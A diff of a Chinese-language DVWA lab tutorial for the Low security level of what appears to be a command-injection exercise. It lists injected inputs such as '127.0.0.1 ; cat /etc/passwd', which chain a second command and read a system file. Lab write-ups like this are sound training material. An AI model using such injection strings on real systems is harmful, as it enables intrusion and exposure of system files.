@@ -55,12 +55,13 @@ DVWA 分為四種安全級別：Low，Medium，High，Impossible
 
 ### Low
 ```
-進行攻擊測試
+攻擊測試
+
 step 1: 輸入127.0.0.1 ==> 點擊提交
 step 2: 輸入127.0.0.1 ; cat /etc/passwd ==> 點擊提交
 step 3: 輸入127.0.0.1 ; cat /etc/passwd | tee /tmp/passwd ==> 點擊提交
 
-==>成果畫面:瀏覽器會彈出“\xss\”
+==>成果畫面
 
 ```
 關鍵程式碼解析
